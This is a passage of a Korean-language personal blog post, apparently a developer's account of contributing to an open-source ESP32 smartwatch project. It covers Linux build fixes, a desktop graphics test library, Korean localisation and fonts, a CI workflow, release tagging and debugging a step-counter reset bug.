찾아보았다.컴파일 이슈 처리cmake 과정에서 Linux OS에서 컴파일이 되지 않는 문제가 있어 건의를 하여 Issue 처리를 진행하였다.그래픽스 라이브러리에서 오류가 발견되어 수정하였고 Linux OS에서도 프로토타입 그래픽 환경을 테스트 해볼 수 있었다.Git-learning오픈소스 활동을 하면서 많이 공부한 것을 꼽으라면 Git이다. 물론 더 공부할 부분이 많지만 현재 PR(Pull Request)를 자유롭게 요청하고 커밋을 생성 취소를 자유롭게 하면서 최소한 협업 활동에 방해가 되지 않으려고 공부하고 하나씩 터득하였다. 소스 코드 버전 관리를 위해 만든 Git은 알면 알수록 넓은 세계가 있어 카테고리를 하나 만들어 따로 공부할 예정이다.빠른 UI 개발을 위한 그래픽 라이브러리손목시계 UI를 수정하거나 개발할 때 잦은 업로드와 디바이스 연결을 최소화하고자 데스크탑에서 그래픽 드라이버를 먼저 개발하여 위치나 디자인 등을 테스트할 수 있는 환경을 조정할 수 있다.새로운 Watchface를 개발하기 위해 데스크톱에서 바로 테스트할 수 있는 그래픽 라이브러리를 만들어 여러번 연결하여 업로드하는 번거로움을 최소화할 수 있었다.한국어 파일 추가가장 가볍게 시작할 수 있는 방법을 찾다가 다국어 지원에 먼저 발을 들여 한국어 파일 ko-KR.h를 추가하였다. 첫 관문은 언제나 어렵고 높았다. 제일 먼저 README 파일을 읽으면서 저장소 소프트웨어에 관한 내용을 정독하였다. 또한 세트로 위키 페이지를 참고하여 현재 개발된 기능과 기초 사항들을 파악하였다.Issue 항목을 찾아보면서 현재 논의되는 문제들을 보고서 Commit 내역과 Pull Request를 참고한 끝에 프로젝트 기능과 구조에 대해 이해할 수 있었다.프로젝트 구조는 굉장히 직관적이고 단순한 구조를 띄고 있다고 하고 PR에서 누군가 코드에 관한 코드리뷰를 기입해서 이부분이 굉장히 큰 도움이 되었다. 너무 나무를 보려고 하고 숲을 보지 않은 것이 문제였다.이로써 첫 PR을 내가 관심있는 저장소에서 Merge하였다.ESP32 한글 폰트 Issue실제로 한글 폰트를 사용해보려 했으나 한글폰트가 지원이 안되는 걸로 확인이 되어 UTF-8 키워드를 중심으로 문제를 찾고 있다. 폰트파일과 한글 글꼴에 특유의 초성, 중성, 종성을 만들어주는 함수를 프로젝트에 첨가하면 될 거 같다. 메인테이너가 글꼴 수정 방법을 공유해주고 수시로 연락체계를 유지해 한글화 패치를 완성하고자 한다. 가능하다면 다른 언어에 대한 패치도 도와주고자 한다.워크플로우 생성로컬에서 라이브러리의 빌드/컴파일을 확인할 수 있지만 원격에서도 확인하면 좋을 거 같아서 워크를로우를 구축하였다.CI 구문을 이해하는데 어렵지 않았지만 원하는 동작을 실행시키기 위해 필요한 문법을 외부 커맨드와 규칙을 지키며 상호작용시키는데 어려웠다.새로운 제품에 관하여OledWatch를 개발할 때 가장 초점을 맞춘 것은 실생활에 기성품에게 지지 않을 기능을 추가하는 것이다. 끝에 생각한 것이 그 당시 손목시계에 진동모터를 넣어 시끄러운 알람으로 아침에 일어나는 것이 아니라 진동을 느껴 조용히 아침을 맞이할 수 있는 방법을 구상한 것이다. 이를 현재 활동하고 있는 오픈소스 커뮤니티 프로젝트에 적용시켜 추후 제품 하드웨어에 추가 설계에 건의하였다.추후 하드웨어를 보강하여 새로운 제품을 런칭할 생각인데 현재 Issue로 재밌는 기능들을 계획하고 있어 여러 기능을 복합적으로 구현하여 기성품에 못지 않는 디바이스를 선보일 예정이다.Sprint-Process이전에 프로젝트는 아무리 아이디어를 내고 기능을 구현하더라도 같은 머릿속에서 나오기에 한계가 있고 스스로 어려운 길은 피하고 싶은 본능이 엿보인다. 커뮤니티에서 과제를 진행하면서 피하지 않고 공부할 수 있게 되었고 커뮤니티 발전을 위해 아낌없이 이슈를 열어 성장을 도모할 수 있었다.안정화 버전 등록여러 수정된 코드와 필요한 기능을 함축한 커밋 버전을 Release하여 등록하였다. 손목시계를 사용하다보면 불안정한 베타 버전이나 개발 버전 위에서 버그가 생길 때 제대로 기능을 수행하지 못하는 일이 종종 있었다. Release TAG를 활용해 오픈소스 코드로 안정화된 손목시계를 사용하고자 한다.걸음 수 카운트 이슈( Why not working Step Counter ? )걸음수 카운트가 오작동하는 이슈가 발견되어 이에 대한 원인을 추적하였다.메인테이너에게 처음 언급 하였을 때 다른 개발자들 사이에서는 따로 문제가 포착되지 않았다.결과적으로 숨겨진 에러를 찾았고 당장 눈 앞에 놓인 문제보다 실질적인 원인을 뿌리 뽑는데 집중한 것이 큰 도움이 되었다.디버깅을 진행하고 원본 저장소에 내용을 현재 포크 저장소와 비교하여 어떤 부분이 다른지 세세하게 확인하고 있다.자정을 지나고서 확인했을 때 문제가 없었지만 시계를 Always On 상태로 모니터링하면서 확인한 결과 발견하지 못한 문제를 찾았다.자정 정각 돌입하기 전 걸음 수 모습이다. 금요일과 토요일에 걸음 수가 카운팅 되어 있는 것을 볼 수 있다.Always On 상태로 모니터링했을 때 걸음 수 이동 모습이다.요일을 가리키는 프레임 박스가 이동하면서 걸음 수 역시 같이 이동하는 것을 볼 수 있다. 또한 걸음 수 역시 초기화되지 않은 것을 확인할 수 있다. 초기 언급된 합산이 되지 않는 문제는 해결이 되었다.Reset 버튼 입력 후 변화된 모습이다.값이 원래 출력되야 하는 모습으로 디스플레이되었다.트러블슈팅입문자들이 많은 업로드 문제를 겪어 많이 나왔던 문제들을 모아 기술문서에 트러블슈팅 항목으로 만들어 올렸다." } ]
